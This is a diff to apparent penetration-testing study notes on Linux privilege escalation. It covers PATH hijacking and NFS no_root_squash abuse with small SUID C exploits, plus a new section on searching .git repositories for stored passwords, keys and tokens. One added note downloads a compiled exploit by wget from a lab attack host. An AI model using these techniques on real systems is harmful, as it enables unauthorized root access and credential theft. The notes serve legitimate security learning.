@@ -113,11 +113,11 @@ If a script is editable and runs as root, replace its contents with a reverse sh
 ### PATH Variable Hijacking
 The `PATH` environment variable tells the system where to find executables.
 
-- Check PATH:
+- **Check PATH:**
 ```bash
 echo $PATH
 ```
-- Check for writable directories:
+- **Check for writable directories:**
 ```bash
 find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
 ```
@@ -131,7 +131,7 @@ If a writable directory is in `PATH`, you can create a fake binary with the same
 void main() {
   setuid(0);
   setgid(0);
-  system("thm");
+  system("test");
 }
 ```
 2. Compile and set SUID:
@@ -139,11 +139,14 @@ void main() {
 gcc path_exp.c -o path -w
 chmod u+s path
 ```
-3. Add writable dir to PATH and place `thm`:
+- *Note: If victim machine doesn't have compiler, go on attacking machine, create the file, compile on attacking machine*
+	- *Compile the file with the `-static` flag at the end to contain all the libraries it needs to bypass any mismatch issues*
+	- *Host python server and `wget` from victim machine (`python3 -m http.server 4545` - `wget http://10.10.14.14:4545/path`)*
+3. Add writable dir to PATH and place `test`:
 ```bash
 export PATH=/tmp:$PATH
-echo "/bin/bash" > /tmp/thm
-chmod 777 /tmp/thm
+echo "/bin/bash" > /tmp/test
+chmod 777 /tmp/test
 ./path
 ```
 
@@ -156,16 +159,16 @@ If `no_root_squash` is set for an exported share, files created by root on the c
 ```bash
 cat /etc/exports
 ```
-- Find exports:
+- Find exports (from attacking machine):
 ```bash
 showmount -e <target-IP>
 ```
-- Mount the export:
+- Mount the export (from attacking machine):
 ```bash
 mkdir /tmp/backupsonattackermachine
 mount -o rw <target-IP>:/backups /tmp/backupsonattackermachine
 ```
-- Create exploit file (`nfs.c`):
+- Create exploit file to set SUID bits:
 ```c
 int main() {
   setgid(0);
@@ -174,7 +177,7 @@ int main() {
   return 0;
 }
 ```
-- Compile and set SUID:
+- Compile into the */tmp/backupsonattackermachine* and set SUID:
 ```bash
 gcc nfs.c -o nfs -w
 chmod +s nfs
@@ -210,4 +213,60 @@ ssh user@<IP_ADDRESS> -i key_file
 ```
 
 ---
-
+### Search .git repositories
+This method is valuable for uncovering exposed credentials and sensitive information that could lead to privilege escalation from .git repositories
+#### 1. **Locate `.git` directories**
+- **Command**:
+```
+find / -type d -name ".git" 2>/dev/null    
+```
+- **What to Look For**:  
+    Search the system for any Git repositories. These often exist in web directories, user folders, or application directories.
+#### 2. **Inspect `.git/config` for stored credentials**
+- **Command**:
+```
+cat /path/to/.git/config
+```
+- **What to Look For**:  
+    This file may contain remote URLs with embedded credentials, like `https://username:password@repo.git`, which could provide access to remote systems or services.
+#### 3. **Check `.git/logs/HEAD` for user actions**
+- **Command**:
+```
+cat /path/to/.git/logs/HEAD
+```
+- **What to Look For**:  
+    The log shows commits and actions taken by users in the repository, which can reveal usernames, project paths, or internal system information.
+#### 4. **Search for sensitive data in the repository’s history**
+- **Command**:
+```bash
+git --git-dir=/path/to/.git log --all --grep="password"
+```
+- **What to Look For**:  
+    Look through commit messages and diffs for sensitive information like passwords, keys, tokens, or configuration details.
+#### 5. **Search for secrets in all files within the repository**
+- **Command**:
+```bash
+git --git-dir=/path/to/.git grep -iE "password|key|token|secret"
+```
+- **What to Look For**:  
+    This command searches all files in the repository for common secrets or sensitive data like hardcoded API keys or SSH private keys.
+#### 6. **Extract files from `.git`**
+- **Command**:
+```bash
+git --git-dir=/path/to/.git checkout .
+```
+- **What to Look For**:  
+    This command restores deleted or hidden files that may contain secrets, configuration details, or exploitables (e.g., scripts with root access).
+#### 7. **Examine `.git/refs/heads` for active branches**
+- **Command**:
+```
+cat /path/to/.git/refs/heads/*
+```
+- **What to Look For**:  
+    Check for active branches that may contain unmerged code, config changes, or other potential vulnerabilities.
+---
+#### **Summary of What You're Looking For**:
+- **Credentials**: Hardcoded usernames, passwords, tokens, API keys.
+- **User Activity**: Commit history, user actions (e.g., usernames, systems involved).
+- **Sensitive Files**: Code, config files, scripts with sensitive info.
+- **Secrets in History**: Hidden or deleted secrets that may be recovered.
